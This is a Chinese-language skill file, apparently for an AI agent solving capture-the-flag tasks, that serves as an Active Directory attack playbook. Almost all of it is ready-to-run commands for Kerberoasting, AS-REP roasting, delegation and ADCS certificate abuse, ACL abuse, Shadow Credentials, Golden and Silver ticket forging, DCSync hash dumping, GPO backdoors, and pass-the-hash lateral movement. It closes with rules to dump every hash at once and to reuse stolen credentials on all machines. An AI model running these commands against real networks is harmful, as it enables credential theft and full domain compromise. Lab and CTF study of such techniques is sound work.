---
name: ad
description: Active Directory 域渗透。覆盖 Kerberoasting、ASREPRoasting、委派攻击（约束/非约束/基于资源）、ADCS 证书滥用（ESC1-ESC8）、ACL 滥用、Shadow Credentials、BloodHound 分析、域信任利用、Golden/Silver Ticket、DCSync、Group Policy 攻击。
---

# Active Directory 域渗透

> 当题目涉及 Windows 域环境、Kerberos、域控、AD CS、LDAP、SMB 域认证时使用。
> 离线环境原则：只用本机已有工具（impacket / crackmapexec / bloodhound / certipy），禁止下载外部工具。

## 域信息收集
```bash
# 基本域信息
crackmapexec smb $TARGET -u user -p pass --domain DOMAIN
# 域控识别
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN
# 用户/组枚举
ldapsearch -x -H ldap://$TARGET -b "DC=DOMAIN,DC=LOCAL" "(objectclass=user)" sAMAccountName
# BloodHound 数据采集（如果有 SharpHound/bloodhound-python）
bloodhound-python -u user -p pass -d DOMAIN -dc dc.DOMAIN -c All --zip
```

## Kerberoasting（找 SPN 账户，离线破解 TGS）
```bash
# 枚举有 SPN 的账户
GetUserSPNs.py DOMAIN/user:pass -dc-ip $TARGET -request
# 或用 impacket
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip $TARGET -outputfile hashes.txt
# 离线破解（hashcat 模式 13100）
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
#  crackmapexec 一步到位
crackmapexec ldap $TARGET -u user -p pass --kerberoasting kerberoast.txt
```

## ASREPRoasting（不需要预认证的账户）
```bash
# 枚举不需要预认证的用户
GetNPUsers.py DOMAIN/ -dc-ip $TARGET -usersfile users.txt -no-pass
# 有凭证时直接请求 TGT
impacket-GetNPUsers DOMAIN/user:pass -dc-ip $TARGET -request -outputfile asrep.txt
# hashcat 模式 18200
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## 委派攻击
```bash
# 非约束委派（Unconstrained Delegation）— 域控默认开启
# 找到开了非约束委派的机器 → 诱使域控访问它 → 从内存拿 TGT
finddelegation.py DOMAIN/user:pass -dc-ip $TARGET
# 约束委派（Constrained Delegation）— S4U2Self + S4U2Proxy
# 找到有 TRUSTED_TO_AUTH_FOR_DELEGATION 的账户
getST.py DOMAIN/svc_account:pass -spn cifs/target.DOMAIN -impersonate Administrator
# 基于资源的约束委派（RBCD）— 写 msDS-AllowedToActOnBehalfOfOtherIdentity
# 需要对目标机器有写权限（GenericWrite/GenericAll）
rbcd.py DOMAIN/user:pass -delegate-to target$ -delegate-from attacker$ -dc-ip $TARGET
```

## ADCS 证书滥用（ESC1-ESC8）
```bash
# 枚举证书模板（用 certipy）
certipy find -u user@DOMAIN -p pass -dc-ip $TARGET -vulnerable
# ESC1: 模板允许任意 SAN + 低权限可申请
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template VulnTemplate \
  -upn administrator@DOMAIN -target $TARGET
# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 + 低权限模板
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template User \
  -upn administrator@DOMAIN
# ESC8: Web Enrollment 中继（NTLM relay to ADCS）
# 用 ntlmrelayx 中继到 http://CA/certsrv/
# ESC3: 代理证书模板（Enrollment Agent）
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template AgentTemplate
certipy req -u user@DOMAIN -p pass -ca CA-NAME -template User \
  -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
# 拿到证书 → 提取 hash 或直接认证
certipy auth -pfx admin.pfx -dc-ip $TARGET
```

## ACL 滥用
```bash
# BloodHound 查 ACL 攻击路径
# GenericAll/GenericWrite → 修改目标属性 → RBCD / Shadow Credentials / 重置密码
# WriteDACL → 给自己加 DCSync 权限
# ForceChangePassword → 直接改目标用户密码
# AddMember → 把自己加进高权限组
# 用 dacledit / bloodyAD 操作
bloodyAD -u user -p pass -d DOMAIN --host $TARGET addGenericAll target_user
```

## Shadow Credentials（写 msDS-KeyCredentialLink）
```bash
# 需要对目标有 GenericWrite / GenericAll
# 写入伪造的 Key Credential → 获取 TGT
pywhisker -u user@DOMAIN -p pass --target target_user --action add
# 获取的证书 → 提取 NT hash
certipy auth -pfx shadow.pfx -dc-ip $TARGET
```

## Golden / Silver Ticket
```bash
# Golden Ticket（有 krbtgt hash 后伪造任意 TGT）
ticketer.py -nthash KRBTGT_NT_HASH -domain-sid S-1-5-21-XXX -domain DOMAIN \
  -spn cifs/dc.DOMAIN administrator
# Silver Ticket（有服务账户 hash 后伪造该服务的 TGS）
ticketer.py -nthash SVC_NT_HASH -domain-sid S-1-5-21-XXX -domain DOMAIN \
  -spn cifs/target.DOMAIN administrator
# 注入 ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DOMAIN/administrator@target
```

## DCSync（域控权限后拉所有 hash）
```bash
# 需要 DCSync 权限（Domain Admins / 被 WriteDACL 授权）
secretsdump.py DOMAIN/user:pass@dc.DOMAIN -just-dc -ntds
# 提取所有用户的 NT hash → 离线破解 / Pass-the-Hash
```

## Group Policy 攻击
```bash
# GPO 里可能存储明文密码（SYSVOL/cpassword）
find /mnt/sysvol -name "*.xml" | xargs grep -l "cpassword"
# 解密 cpassword（AES-256 固定密钥，公开）
gpp-decrypt "加密的cpassword字符串"
# 修改 GPO 添加后门启动脚本
# 用 pyGPOAbuse 给目标 OU 加即时计划任务
pygpoabuse DOMAIN/user:pass -hashes LM:NT -gpo-id GPO_GUID -f
```

## Pass-the-Hash / Pass-the-Ticket
```bash
# Pass-the-Hash（有 NT hash 直接横向）
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@target
crackmapexec smb target -u user -H NTHASH -x "whoami"
# Pass-the-Ticket（有 Kerberos ticket）
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass DOMAIN/user@target
```

## 域信任利用
```bash
# 列出域信任关系
nltest /domain_trusts
# 跨域：子域 → 父域（有子域 krbtgt hash → Golden Ticket 带 SIDHistory）
ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD.DOMAIN \
  -extra-sid PARENT_SID-519 administrator
# 外部信任：利用 SIDHistory 跨林（需要 Enterprise Admins 或等效）
```

## 关键规则
- **先枚举再打**：BloodHound 一把梭找最短攻击路径，不要盲打
- **Kerberoasting 优先**：最常见的初始突破口，SPN 账户密码通常较弱
- **ADCS 是当前热点**：ESC1/ESC6 最常见，certipy find 一键枚举
- **拿到域控权限后立即 DCSync**：拉全量 hash 比逐个提权高效
- **横向复用凭证**：一个账户的密码/hash 在所有机器上试（密码重用极其常见）
- **flag 位置**：通常在域控桌面/Administrator 目录/SYSVOL 共享/数据库
